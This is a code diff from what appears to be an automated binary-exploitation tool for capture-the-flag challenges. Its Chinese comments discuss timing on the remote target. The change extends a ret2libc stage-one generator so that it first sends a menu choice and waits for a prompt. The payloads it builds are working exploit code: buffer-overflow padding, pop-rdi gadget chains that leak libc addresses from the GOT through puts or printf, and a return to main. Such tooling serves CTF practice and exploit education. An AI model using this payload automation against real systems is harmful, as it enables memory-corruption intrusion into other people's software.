@@ -586,19 +586,24 @@ def s_ret2libc(ch: Challenge, f: Facts) -> Iterable[Plan]:
             # （repeater 实测 1024 → puts(stupid) → 程序结束），破坏三阶段时序。
             # read sink 的溢出本来就不需要 preset，远程只跑干净 payload。
             presets = [b""]
-        for pre in presets:
-            if ch.elf.bits == 64:
-                chain = ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt)
-                if got2:
-                    chain += ch.p64(pop_rdi) + ch.p64(got2) + ch.p64(leak_plt)
-                payload = _pad(ch, off) + _align(ch, f, True) + chain + ch.p64(main)
-            else:
-                payload = (_pad(ch, off) + ch.p32(leak_plt) + ch.p32(main) + ch.p32(got))
-            sends = ([pre] if pre else []) + [payload + _term(sink)]
-            extra = "+printf" if got2 else ""
-            yield Plan("ret2libc", sends,
-                       f"leak {leak_name}{extra}@{hex(got)} off={off}",
-                       tag=f"stage1:{leak_name}:{off}:{sink}")
+        for m, prompt in _prelude_variants(f):
+            if m:
+                presets = [b""]      # 已过菜单，下一条输入直接就是 payload
+            for pre in presets:
+                if ch.elf.bits == 64:
+                    chain = ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt)
+                    if got2:
+                        chain += ch.p64(pop_rdi) + ch.p64(got2) + ch.p64(leak_plt)
+                    payload = _pad(ch, off) + _align(ch, f, True) + chain + ch.p64(main)
+                else:
+                    payload = (_pad(ch, off) + ch.p32(leak_plt) + ch.p32(main) + ch.p32(got))
+                sends = ([Send(m), Wait(prompt)] if m else []) \
+                    + ([pre] if pre else []) + [payload + _term(sink)]
+                extra = "+printf" if got2 else ""
+                yield Plan("ret2libc", sends,
+                           f"leak {leak_name}{extra}@{hex(got)} off={off}"
+                           + (f" menu={m!r}" if m else ""),
+                           tag=f"stage1:{leak_name}:{off}:{sink}")
 
 
 # --------------------------------------------------------------------------- 6. ret2shellcode
